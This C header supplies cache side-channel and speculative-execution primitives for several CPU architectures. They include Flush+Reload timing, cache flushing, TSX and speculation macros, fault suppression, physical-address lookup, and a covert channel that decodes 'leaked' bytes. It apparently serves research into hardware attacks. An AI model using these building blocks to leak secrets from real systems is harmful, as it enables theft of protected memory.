#pragma once
#ifndef _CACHEUTILS_H_
#define _CACHEUTILS_H_

#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#if defined(__x86_64__)

#elif defined(__i386__)

#include <cpuid.h>

#elif defined(__aarch64__)

#if ARM_CLOCK_SOURCE == ARM_CLOCK_MONOTONIC
#include <time.h>
#define ARM_PERF 1
#define ARM_CLOCK_MONOTONIC 2
#define ARM_TIMER 3
#endif
#endif

/* ============================================================
 *                    User configuration
 * ============================================================ */
size_t CACHE_MISS = 150;

#define USE_RDTSC_BEGIN_END 0

#define USE_RDTSCP 1

#define ARM_CLOCK_SOURCE ARM_CLOCK_MONOTONIC

/* ============================================================
 *                  User configuration End
 * ============================================================ */

// ---------------------------------------------------------------------------
jmp_buf trycatch_buf;
size_t pagesize = 0;
char *mem;

#if defined(__x86_64__)
// ---------------------------------------------------------------------------
uint64_t rdtsc()
{
  uint64_t a, d;
  asm volatile("mfence");
#if USE_RDTSCP
  asm volatile("rdtscp" : "=a"(a), "=d"(d)::"rcx");
#else
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#endif
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

uint64_t rdtscp()
{
  register uint64_t a, d;
  asm volatile("rdtscp" : "=a"(a), "=d"(d)::"rcx");
  a = (d << 32) | a;
  return a;
}

// ---------------------------------------------------------------------------
uint64_t rdtsc_begin()
{
  uint64_t a, d;
  asm volatile("mfence\n\t"
               "CPUID\n\t"
               "RDTSCP\n\t"
               "mov %%rdx, %0\n\t"
               "mov %%rax, %1\n\t"
               "mfence\n\t"
               : "=r"(d), "=r"(a)
               :
               : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d << 32) | a;
  return a;
}

// ---------------------------------------------------------------------------
uint64_t rdtsc_end()
{
  uint64_t a, d;
  asm volatile("mfence\n\t"
               "RDTSCP\n\t"
               "mov %%rdx, %0\n\t"
               "mov %%rax, %1\n\t"
               "CPUID\n\t"
               "mfence\n\t"
               : "=r"(d), "=r"(a)
               :
               : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d << 32) | a;
  return a;
}

// ---------------------------------------------------------------------------
void flush(void *p)
{
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
void maccess(void *p)
{
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
void lfence() { asm volatile("lfence"); }

// ---------------------------------------------------------------------------
void sfence() { asm volatile("sfence"); }

// ---------------------------------------------------------------------------
void nospec() { asm volatile("lfence"); }

// ---------------------------------------------------------------------------
unsigned int xbegin()
{
  unsigned status;
  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
               : "=a"(status)
               : "a"(-1UL)
               : "memory");
  return status;
}

// ---------------------------------------------------------------------------
void xend() { asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory"); }

#include <cpuid.h>
// ---------------------------------------------------------------------------
int has_tsx()
{
  if (__get_cpuid_max(0, NULL) >= 7)
  {
    unsigned a, b, c, d;
    __cpuid_count(7, 0, a, b, c, d);
    return (b & (1 << 11)) ? 1 : 0;
  }
  else
  {
    return 0;
  }
}

// ---------------------------------------------------------------------------
void maccess_tsx(void *ptr)
{
  if (xbegin() == (~0u))
  {
    maccess(ptr);
    xend();
  }
}

#define speculation_start(label) asm goto("call %l0" : : : : label##_retp);
#define speculation_end(label)                                                                      \
  asm goto("jmp %l0" : : : : label);                                                                \
  label##_retp : asm goto("lea %l0(%%rip), %%rax\nmovq %%rax, (%%rsp)\nret\n" : : : "rax" : label); \
  label:                                                                                            \
  asm volatile("nop");

#elif defined(__i386__)
// ---------------------------------------------------------------------------
uint32_t rdtsc()
{
  uint32_t a, d;
  asm volatile("mfence");
#if USE_RDTSCP
  asm volatile("rdtscp" : "=a"(a), "=d"(d));
#else
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#endif
  asm volatile("mfence");
  return a;
}

// ---------------------------------------------------------------------------
void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p)); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("mov (%0), %%eax\n" : : "c"(p) : "eax"); }

// ---------------------------------------------------------------------------
void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
void nospec() { asm volatile("lfence"); }

// ---------------------------------------------------------------------------
int has_tsx()
{
  if (__get_cpuid_max(0, NULL) >= 7)
  {
    unsigned a, b, c, d;
    __cpuid_count(7, 0, a, b, c, d);
    return (b & (1 << 11)) ? 1 : 0;
  }
  else
  {
    return 0;
  }
}

#elif defined(__aarch64__)
// ---------------------------------------------------------------------------
uint64_t rdtsc()
{
#if ARM_CLOCK_SOURCE == ARM_PERF
  long long result = 0;

  asm volatile("DSB SY");
  asm volatile("ISB");

  if (read(perf_fd, &result, sizeof(result)) < (ssize_t)sizeof(result))
  {
    return 0;
  }

  asm volatile("ISB");
  asm volatile("DSB SY");

  return result;
#elif ARM_CLOCK_SOURCE == ARM_CLOCK_MONOTONIC
  asm volatile("DSB SY");
  asm volatile("ISB");
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  uint64_t res = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;
  asm volatile("ISB");
  asm volatile("DSB SY");
  return res;
#elif ARM_CLOCK_SOURCE == ARM_TIMER
  uint64_t result = 0;

  asm volatile("DSB SY");
  asm volatile("ISB");
  asm volatile("MRS %0, PMCCNTR_EL0" : "=r"(result));
  asm volatile("DSB SY");
  asm volatile("ISB");

  return result;
#else
#error Clock source not supported
#endif
}
// ---------------------------------------------------------------------------
uint64_t rdtsc_begin()
{
#if ARM_CLOCK_SOURCE == ARM_PERF
  long long result = 0;

  asm volatile("DSB SY");
  asm volatile("ISB");

  if (read(perf_fd, &result, sizeof(result)) < (ssize_t)sizeof(result))
  {
    return 0;
  }

  asm volatile("DSB SY");

  return result;
#elif ARM_CLOCK_SOURCE == ARM_CLOCK_MONOTONIC
  asm volatile("DSB SY");
  asm volatile("ISB");
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  uint64_t res = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;
  asm volatile("DSB SY");
  return res;
#elif ARM_CLOCK_SOURCE == ARM_TIMER
  uint64_t result = 0;

  asm volatile("DSB SY");
  asm volatile("ISB");
  asm volatile("MRS %0, PMCCNTR_EL0" : "=r"(result));
  asm volatile("ISB");

  return result;
#else
#error Clock source not supported
#endif
}

// ---------------------------------------------------------------------------
uint64_t rdtsc_end()
{
#if ARM_CLOCK_SOURCE == ARM_PERF
  long long result = 0;

  asm volatile("DSB SY");

  if (read(perf_fd, &result, sizeof(result)) < (ssize_t)sizeof(result))
  {
    return 0;
  }

  asm volatile("ISB");
  asm volatile("DSB SY");

  return result;
#elif ARM_CLOCK_SOURCE == ARM_CLOCK_MONOTONIC
  asm volatile("DSB SY");
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  uint64_t res = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;
  asm volatile("ISB");
  asm volatile("DSB SY");
  return res;
#elif ARM_CLOCK_SOURCE == ARM_TIMER
  uint64_t result = 0;

  asm volatile("DSB SY");
  asm volatile("MRS %0, PMCCNTR_EL0" : "=r"(result));
  asm volatile("DSB SY");
  asm volatile("ISB");

  return result;
#else
#error Clock source not supported
#endif
}

// ---------------------------------------------------------------------------
void flush(void *p)
{
  asm volatile("DC CIVAC, %0" ::"r"(p));
  asm volatile("DSB ISH");
  asm volatile("ISB");
}

// ---------------------------------------------------------------------------
void maccess(void *p)
{
  volatile uint32_t value;
  asm volatile("LDR %0, [%1]\n\t" : "=r"(value) : "r"(p));
  asm volatile("DSB ISH");
  asm volatile("ISB");
}

// ---------------------------------------------------------------------------
void mfence() { asm volatile("DSB ISH"); }

// ---------------------------------------------------------------------------
void nospec() { asm volatile("DSB SY\nISB"); }

#elif defined(__riscv)

// ---------------------------------------------------------------------------
uint64_t rdtsc()
{
  register uint64_t val;
  asm volatile("rdcycle %0" : "=r"(val));
  return val;
}

uint64_t rdtime()
{
  uint64_t val;
  asm volatile("rdtime %0" : "=r"(val));
  return val;
}

// ---------------------------------------------------------------------------
void flush(void *p) { asm volatile("fence.i"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("lw t0, 0(%0)" ::"r"(p) : "t0"); }

// ---------------------------------------------------------------------------
void mfence() { asm volatile("fence"); }

// ---------------------------------------------------------------------------
void sfence() { asm volatile("fence"); }

// ---------------------------------------------------------------------------
void ifence() { asm volatile("fence.i"); }

#elif defined(__PPC64__)
#include <sys/platform/ppc.h>
uint64_t rdtsc()
{
  uint64_t time;
  asm volatile("mfspr %0, 268\n\t"
               "lwsync\n\t"
               : "=r"(time));

  return time;
}

// ---------------------------------------------------------------------------
uint64_t rdtsc_begin()
{
  uint64_t time;
  asm volatile("mfspr %0, 268\n\t"
               "lwsync\n\t"
               : "=r"(time));

  return time;
}

// ---------------------------------------------------------------------------
uint64_t rdtsc_end()
{
  uint64_t time;
  asm volatile("mfspr %0, 268\n\t"
               "lwsync\n\t"
               : "=r"(time));

  return time;
}

// ---------------------------------------------------------------------------
void flush(void *p)
{
  asm volatile("dcbf 0, %0\n\t"
               "dcs\n\t"
               "ics\n\t"
               :
               : "r"(p)
               :);
}

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("ld %%r0, 0(%0)" ::"r"(p) : "r0"); }

// ---------------------------------------------------------------------------
void mfence() { asm volatile("lwsync"); }

// ---------------------------------------------------------------------------
void nospec() { asm volatile("hwsync"); }
#endif

// ---------------------------------------------------------------------------
int flush_reload(void *ptr)
{
#if defined(__i386__)
  uint32_t start = 0, end = 0;
#else
  uint64_t start = 0, end = 0;
#endif

#if USE_RDTSC_BEGIN_END
  start = rdtsc_begin();
#else
  start = rdtsc();
#endif
  maccess(ptr);
#if USE_RDTSC_BEGIN_END
  end = rdtsc_end();
#else
  end = rdtsc();
#endif

  mfence();

  flush(ptr);

  if (end - start < CACHE_MISS)
  {
    return 1;
  }
  return 0;
}

// ---------------------------------------------------------------------------
int flush_reload_t(void *ptr)
{
  uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
  start = rdtsc_begin();
#else
  start = rdtsc();
#endif
  maccess(ptr);
#if USE_RDTSC_BEGIN_END
  end = rdtsc_end();
#else
  end = rdtsc();
#endif

  mfence();

  flush(ptr);

  return (int)(end - start);
}

// ---------------------------------------------------------------------------
int reload_t(void *ptr)
{
#if defined(__i386__)
  uint32_t start = 0, end = 0;
#else
  uint64_t start = 0, end = 0;
#endif

#if USE_RDTSC_BEGIN_END
  start = rdtsc_begin();
#else
  start = rdtsc();
#endif
  maccess(ptr);
#if USE_RDTSC_BEGIN_END
  end = rdtsc_end();
#else
  end = rdtsc();
#endif

  mfence();

  return (int)(end - start);
}

// ---------------------------------------------------------------------------
size_t detect_flush_reload_threshold()
{
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;

  maccess(ptr);
  for (i = 0; i < count; i++)
  {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++)
  {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

// ---------------------------------------------------------------------------
void maccess_speculative(void *ptr)
{
  int i;
  size_t dummy = 0;
  void *addr;

  for (i = 0; i < 50; i++)
  {
    size_t c = ((i * 167) + 13) & 1;
    addr = (void *)(((size_t)&dummy) * c + ((size_t)ptr) * (1 - c));
    flush(&c);
    mfence();
    if (c / 0.5 > 1.1)
      maccess(addr);
  }
}

// ---------------------------------------------------------------------------
void unblock_signal(int signum __attribute__((__unused__)))
{
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

// ---------------------------------------------------------------------------
void trycatch_segfault_handler(int signum)
{
  (void)signum;

  int i;
  for (i = 1; i < 32; i++)
  {
    unblock_signal(i);
  }
  longjmp(trycatch_buf, 1);
}

// ---------------------------------------------------------------------------
int try_start()
{
#if defined(__i386__) || defined(__x86_64__)
  if (has_tsx())
  {
    unsigned status;
    // tsx begin
    asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                 : "=a"(status)
                 : "a"(-1UL)
                 : "memory");
    return status == (~0u);
  }
  else
#endif
  {
    int i;
    for (i = 1; i < 32; i++)
    {
      signal(i, trycatch_segfault_handler);
    }
    return !setjmp(trycatch_buf);
  }
}

// ---------------------------------------------------------------------------
void try_end()
{
#if defined(__i386__) || defined(__x86_64__)
  if (!has_tsx())
#endif
  {
    int i;
    for (i = 1; i < 32; i++)
    {
      signal(i, SIG_DFL);
    }
  }
}

// ---------------------------------------------------------------------------
void try_abort()
{
#if defined(__i386__) || defined(__x86_64__)
  if (has_tsx())
  {
    asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
  }
  else
#endif
  {
    maccess(0);
  }
}

// ---------------------------------------------------------------------------
size_t get_physical_address(size_t vaddr)
{
  int fd = open("/proc/self/pagemap", O_RDONLY);
  uint64_t virtual_addr = (uint64_t)vaddr;
  size_t value = 0;
  off_t offset = (virtual_addr / 4096) * sizeof(value);
  int ret = pread(fd, &value, sizeof(value), offset);
  assert(ret == sizeof(value));
  close(fd);
  return (value << 12) | ((size_t)vaddr & 0xFFFULL);
}

// ---------------------------------------------------------------------------
void cache_init()
{
  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char *)malloc(pagesize * 256);
  memset(mem, 1, pagesize * 256);
  mfence();
}

// ---------------------------------------------------------------------------
void cache_encode(char data) { maccess(mem + data * pagesize); }

// ---------------------------------------------------------------------------
void cache_decode_pretty(char *leaked, int index)
{
  for (int i = 0; i < 256; i++)
  {
    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if (flush_reload(mem + mix_i * pagesize))
    {
      if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ')
      {
        leaked[index] = mix_i;
        printf("\x1b[33m%s\x1b[0m\r", leaked);
      }
      fflush(stdout);
      sched_yield();
    }
  }
}

// ---------------------------------------------------------------------------
void cache_flush_shared_memory()
{
  for (int j = 0; j < 256; j++)
  {
    flush(mem + j * pagesize);
  }
}

#endif /* _CACHEUTILS_H_ */